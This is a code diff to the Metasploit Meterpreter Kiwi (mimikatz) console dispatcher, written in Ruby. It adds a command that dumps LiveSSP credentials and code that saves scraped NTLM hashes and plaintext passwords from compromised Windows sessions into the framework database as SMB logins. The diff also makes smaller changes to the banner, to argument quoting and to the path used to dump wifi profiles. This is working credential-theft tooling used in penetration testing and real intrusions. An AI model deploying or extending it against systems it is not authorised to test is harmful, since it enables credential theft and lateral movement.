@@ -37,8 +37,8 @@ class Console::CommandDispatcher::Kiwi
   def initialize(shell)
     super
     print_line
-    print_line("  .#####.   mimikatz 2.1.1 20180925 (#{client.session_type})")
-    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\"")
+    print_line("  .#####.   mimikatz 2.2.0 20191125 (#{client.session_type})")
+    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)")
     print_line(" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
     print_line(" ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")
     print_line(" '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )")
@@ -49,10 +49,6 @@ class Console::CommandDispatcher::Kiwi
     if client.arch == ARCH_X86 && si['Architecture'] == ARCH_X64
       print_warning('Loaded x86 Kiwi on an x64 architecture.')
       print_line
-    end
-
-    if si['OS'] =~ /Windows (NT|XP|2000|2003|\.NET)/i
-      print_warning("Loaded Kiwi on an old OS (#{si['OS']}). Did you mean to 'load mimikatz' instead?")
     end
   end
 
@@ -67,6 +63,7 @@ class Console::CommandDispatcher::Kiwi
       'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
       'creds_msv'             => 'Retrieve LM/NTLM creds (parsed)',
       'creds_ssp'             => 'Retrieve SSP creds',
+      'creds_livessp'         => 'Retrieve Live SSP creds',
       'creds_tspkg'           => 'Retrieve TsPkg creds (parsed)',
       'creds_kerberos'        => 'Retrieve Kerberos creds (parsed)',
       'creds_all'             => 'Retrieve all credentials (parsed)',
@@ -83,7 +80,10 @@ class Console::CommandDispatcher::Kiwi
   end
 
   def cmd_kiwi_cmd(*args)
-    output = client.kiwi.exec_cmd(args.join(' '))
+    # Kiwi expects instructions with arguments to be quoted so quote everything to be sure
+    # "You can pass instructions on mimikatz command line, those with arguments/spaces must be quoted."
+    # Quote from: https://github.com/gentilkiwi/mimikatz/wiki
+    output = client.kiwi.exec_cmd(args.map { |s| '"' + s + '"'}.join(' '))
     print_line(output)
   end
 
@@ -402,8 +402,7 @@ class Console::CommandDispatcher::Kiwi
   # Dump all the shared wifi profiles/credentials
   #
   def cmd_wifi_list_shared(*args)
-    interfaces_dir = '%AllUsersProfile%\Microsoft\Wlansvc\Profiles\Interfaces'
-    interfaces_dir = client.fs.file.expand_path(interfaces_dir)
+    interfaces_dir = client.sys.config.getenv('AllUsersProfile') + '\Microsoft\Wlansvc\Profiles\Interfaces'
     files = client.fs.file.search(interfaces_dir, '*.xml', true)
 
     if files.length == 0
@@ -490,6 +489,14 @@ class Console::CommandDispatcher::Kiwi
   def cmd_creds_ssp(*args)
     method = Proc.new { client.kiwi.creds_ssp }
     scrape_passwords('ssp', method, args)
+  end
+
+  #
+  # Dump all LiveSSP credentials to screen.
+  #
+  def cmd_creds_livessp(*args)
+    method = Proc.new { client.kiwi.creds_livessp }
+    scrape_passwords('livessp', method, args)
   end
 
   #
@@ -612,6 +619,10 @@ protected
             values << ''
           end
         end
+        if !shell.framework.nil? && shell.framework.db.active
+          user, domain, secret = values
+          report_creds(k, user, domain, secret)
+        end
         table << values
       end
 
@@ -637,6 +648,65 @@ protected
     end
 
     return true
+  end
+
+  def report_smb_cred(credential_core)
+    # Assemble the options hash for creating the Metasploit::Credential::Login object
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      address: client.sock.peerhost,
+      port: 445,
+      service_name: 'smb',
+      protocol: 'tcp',
+      workspace_id: shell.framework.db.workspace.id
+    }
+
+    shell.framework.db.create_credential_login(login_data)
+  end
+
+  def create_cred(credential_data, domain = '')
+    unless domain.blank?
+      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
+      credential_data[:realm_value] = domain
+    end
+    credential_core = shell.framework.db.create_credential(credential_data)
+
+    credential_core
+  end
+
+  def report_creds(type, user, domain, secret)
+    credential_data = {
+        origin_type: :session,
+        post_reference_name: 'kiwi',
+        private_data: nil,
+        private_type: nil,
+        session_id: client.db_record.id,
+        username: user,
+        workspace_id: shell.framework.db.workspace.id
+    }
+
+    return if (user.empty? || secret.eql?('(null)'))
+
+    case type
+    when :msv
+      ntlm_hash = secret.strip.downcase
+      if ntlm_hash != Metasploit::Credential::NTLMHash::BLANK_NT_HASH
+        ntlm_hash = "#{Metasploit::Credential::NTLMHash::BLANK_LM_HASH}:#{ntlm_hash}"
+        # Assemble data about the credential objects we will be creating
+        credential_data[:private_type] = :ntlm_hash
+        credential_data[:private_data] = ntlm_hash
+        credential_core = create_cred(credential_data, domain)
+        report_smb_cred(credential_core)
+      end
+    when :wdigest, :kerberos, :tspkg, :livessp, :ssp
+      # Assemble data about the credential objects we will be creating
+      credential_data[:private_type] = :password
+      credential_data[:private_data] = secret
+
+      credential_core = create_cred(credential_data, domain)
+      report_smb_cred(credential_core)
+    end
   end
 
   #
